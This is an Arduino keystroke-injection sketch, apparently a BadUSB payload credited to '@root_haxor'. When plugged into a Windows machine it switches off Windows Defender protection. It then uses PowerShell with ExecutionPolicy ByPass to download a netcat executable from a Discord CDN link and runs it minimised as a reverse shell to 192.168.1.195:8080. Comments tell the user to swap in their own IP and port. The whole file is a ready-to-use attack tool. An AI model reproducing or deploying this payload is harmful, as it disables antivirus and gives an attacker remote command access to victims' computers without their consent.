#include <Keyboard.h> 
/*
 * Developer @root_haxor !
 */

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  // Turn off Windows Defender
  // ~~ |
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(113);
  Keyboard.releaseAll();

  delay(1000);

  delay(200);

  Keyboard.print("defender");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  delay(1000);

  typeKey(KEY_RETURN);

  typeKey(KEY_TAB);

  delay(100);

  typeKey(KEY_TAB);

  delay(100);

  typeKey(KEY_TAB);

  delay(100);

  typeKey(KEY_TAB);

  delay(100);

  typeKey(KEY_RETURN);

  delay(100);

  typeKey(' ');

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(121);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(1000);

  delay(500);

  // Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it
  // subscribe to my YouTube channel https://www.youtube.com/channel/UCL5HhLmJ7gSkf9zQu39LRoQ (dont really post anything related to this tho xD)
  // for the ip address and the port pls do remove this symbol (<>)
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("START /MIN a.exe 192.168.1.195 8080 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
